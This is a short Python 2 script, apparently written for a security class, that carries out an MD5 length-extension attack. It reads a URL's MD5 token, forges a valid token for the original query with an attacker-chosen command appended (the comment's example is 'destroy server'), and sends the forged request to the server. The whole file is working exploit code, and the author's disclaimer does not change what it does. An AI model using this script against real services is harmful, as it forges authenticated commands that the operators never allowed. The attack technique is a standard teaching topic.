import httplib, urlparse, sys, urllib
from pymd5 import md5, padding

#just a quick script to perform a length extention attack, I wrote this for a
#class and thought it was cool. Please don't use or take this for nefarious
#reasons

#takes 2 arrgs, the url and the extention to e added ie. 'destroy server'

url = sys.argv[1] #argument of the url
ext = sys.argv[2] #argument of the extention

urlSplit = urlparse.urlparse(url) #splits url into usable chunks
query = urlSplit.query # takes the query section from the split url
value = query.split("=")[1].split('&')[0]
urlOG = url.split("=",1)[0]
comSplit = url.split('&',1)[1]

h = md5(state=value.decode('hex'), count=512)
h.update(ext)
token = h.hexdigest()

sizeOf = ((len(comSplit) + 8) * 8) #cause im a C programmer, not python
specChar = urllib.quote(padding(sizeOf))

urlExt = urlOG + "=" + token + "&" + comSplit + specChar + ext # create the url

parsedUrl = urlparse.urlparse(urlExt)
conn = httplib.HTTPSConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
